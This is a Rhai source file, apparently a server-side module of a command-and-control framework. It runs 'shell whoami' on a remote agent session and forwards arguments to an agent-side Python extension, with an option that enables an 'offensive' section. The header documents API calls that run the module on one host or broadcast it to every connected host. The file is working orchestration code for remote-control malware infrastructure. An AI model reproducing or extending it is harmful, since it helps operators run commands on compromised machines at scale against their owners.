// py_showcase_orchestrator.rhai — server-side module
//
// Deploys the agent-side "py_bridge_showcase" extension and passes arguments
// through to it. Demonstrates the division of labor: the module engine on
// the server has NO Python bindings (only send_c2_command,
// send_c2_extension, random_hex_key) — every Python capability lives in the
// agent-side extension, and the module's job is orchestration.
//
// All module args are forwarded verbatim to the extension:
//   args[0] = venv path    ("auto"/"-" or omitted = OS-aware default:
//                           %TEMP% on Windows, /tmp elsewhere)
//   args[1] = sections     ("all" or a comma list, e.g. "1,3,4,7")
//   args[2] = "install"    -> extension bootstraps Python up front when the
//                             target has none, then demos it in section 10
//   args[3] = "offensive"  -> extension also runs section 9 (offensive tiers)
//
// Run:
//   • per session:  POST /api/hosts/:id/modules/py_showcase_orchestrator
//                   {"args": ["/var/tmp/sv", "all", "", "offensive"]}
//   • broadcast:    POST /api/broadcast/module
//                   {"module_name": "py_showcase_orchestrator", "args": [...]}
//   • panel:        Scripts page -> Modules tab -> Run / Broadcast
//
// Declares run(session_id, args); the runner falls back to an empty args
// array when the module is invoked without arguments.

fn run(session_id, args) {
    // Per-run correlation ID: keep server-side audit entries and the
    // agent-side job output tied together. random_hex_key() -> 64 hex chars.
    let run_id  = random_hex_key();
    let run_tag = run_id.sub_string(0, 12);

    print("py_showcase[" + run_tag + "]: session " + session_id.to_string() +
          ", forwarding " + args.len().to_string() + " arg(s) to the agent extension");

    // Sanity context in the session history (works on Linux and Windows).
    let r_ctx = send_c2_command(session_id, "shell whoami");
    print("whoami -> " + r_ctx);

    // Forward every arg through to the extension unchanged.
    let fwd = [];
    for a in args {
        fwd.push(a);
    }

    let res = send_c2_extension(session_id, "py_bridge_showcase", fwd);
    if res.contains("Error") || res.contains("Not Found") {
        return "py_showcase " + run_tag + " FAILED: " + res +
               " (is py_bridge_showcase.rhai in the server extensions dir?)";
    }

    // Everything after this happens on the agent: the extension's report
    // streams back as a job. Poll the job or watch the panel to read it.
    return "py_showcase " + run_tag + ": " + r_ctx + "; " + res +
           "; extension args=" + fwd.to_string() +
           " — output streams back as an agent job";
}
